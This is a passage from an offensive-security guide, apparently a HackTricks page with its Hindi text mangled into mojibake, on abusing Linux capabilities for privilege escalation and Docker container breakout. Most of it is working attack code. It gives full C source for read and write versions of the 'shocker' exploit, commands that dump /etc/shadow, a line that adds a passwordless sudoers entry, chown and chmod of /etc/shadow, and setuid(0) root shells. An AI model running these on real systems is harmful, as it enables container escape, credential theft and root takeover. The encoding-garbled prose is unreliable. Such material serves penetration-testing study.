рдЬрд╛рдирдХрд╛рд░реА рдЬреИрд╕реЗ рдХрд┐ рдЗрдиреЛрдб рдирдВрдмрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╢реЛрд╖рдг рдХреА рд╕рдВрднрд╛рд╡рдирд╛, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рд╕реЗрдмрд╛рд╕реНрдЯрд┐рдпрди рдХреНрд░рд╛рд╣рдорд░ рджреНрд╡рд╛рд░рд╛ рд╢реЙрдХрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд░реНрд╢рд┐рдд рдХреА рдЧрдИ рдереА, рдЬреИрд╕рд╛ рдХрд┐ [рдпрд╣рд╛рдБ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред  
**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк** **рдлрд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЬрд╛рдВрдЪ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкрдврд╝рдиреЗ/рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдмрд╛рдЗрдирд░реА рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдЬреИрд╕реЗ tar рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧреА:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Example with binary2**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред рд░реВрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.

You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** рди рдХреЗрд╡рд▓ рд╣рдореЗрдВ рдЕрдиреБрдорддрд┐ рдЬрд╛рдВрдЪ рдХреЗ рдмрд┐рдирд╛ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рдкрд╛рд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ _**open\_by\_handle\_at(2)**_ рдкрд░ рдХрд┐рд╕реА рднреА рдЬрд╛рдВрдЪ рдХреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ рдФрд░ **рд╣рдорд╛рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реА рдЧрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред

The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
рдпрд╣ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЛ рд╣реЛрд╕реНрдЯ рдкрд░ рдХреБрдЫ рдорд╛рдЙрдВрдЯреЗрдб рдЪреАрдЬрд╝ рдХрд╛ рдкреЙрдЗрдВрдЯрд░ рдвреВрдВрдврдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдореВрд▓ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдиреЗ рдлрд╝рд╛рдЗрд▓ /.dockerinit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдФрд░ рдЗрд╕ рд╕рдВрд╢реЛрдзрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рдиреЗ /etc/hostname рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ред рдпрджрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рд╣реЛрд╕реНрдЯ рдореЗрдВ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ рдорд╛рдЙрдВрдЯ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдХреЛрдб "Abusing DAC\_READ\_SEARCH Capability" рдХреЗ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреЗ рдорд┐рд╢рди** рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рдЕрдиреБрд╢рд╛рд╕рди рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдкреЗрд╢реЗрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд╛рд▓рддрд╛ рд╣реБрдЖ рдмреИрдардХ рдмрд┐рдВрджреБ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред**

рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ,** [**рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ vim рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЬреИрд╕реЗ _passwd_, _sudoers_ рдпрд╛ _shadow_ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Example with binary 2**

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ **`python`** рдмрд╛рдЗрдирд░реА рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред рдЖрдк рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП python рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**рдЙрджрд╛рд╣рд░рдг рд╡рд╛рддрд╛рд╡рд░рдг + CAP\_DAC\_READ\_SEARCH (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк docker рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреЛ рдкрдврд╝реЗрдВ рдЬреЛ [**DAC\_READ\_SEARCH рдХреНрд╖рдорддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдиреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рддрд╛ рд╣реИ**](linux-capabilities.md#cap\_dac\_read\_search) рд╣реЛрд╕реНрдЯ рдХрд╛ рдФрд░ **рд╢реЛрд╖рдг рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ**ред\
рдлрд┐рд░, **рд╢реЙрдХрд░ рд╢реЛрд╖рдг рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ** рдЬреЛ рдЖрдкрдХреЛ рд╣реЛрд╕реНрдЯ рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ **рдордирдорд╛рдиреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.

**The code of this technique was copied from the laboratory of "Abusing DAC\_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**Example with binary**

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ **`python`** рдмрд╛рдЗрдирд░реА рдореЗрдВ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рдЖрдк **shadow** рдлрд╝рд╛рдЗрд▓ рдХрд╛ **owner** рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, **root password** рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
рдпрд╛ **`ruby`** рдмрд╛рдЗрдирд░реА рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдорддрд┐ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдкрд╛рдпрдерди рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдЖрдк рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, **рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдмрдирд╛рдП рдЧрдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдкрд╛рдпрдерди рдореЗрдВ рдпрд╣ **рдХреНрд╖рдорддрд╛** рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рд░реВрдЯ рддрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**рдПрдХ рдФрд░ рддрд░реАрдХрд╛:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдмрдирд╛рдП рдЧрдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдкреНрд░рднрд╛рд╡реА рд╕рдореВрд╣ рдЖрдИрдбреА рд╕реЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред**

рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рд╕рд╛рд░реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ,** [**рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рдЙрди рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╕рдореВрд╣ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рд╕рдореВрд╣ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
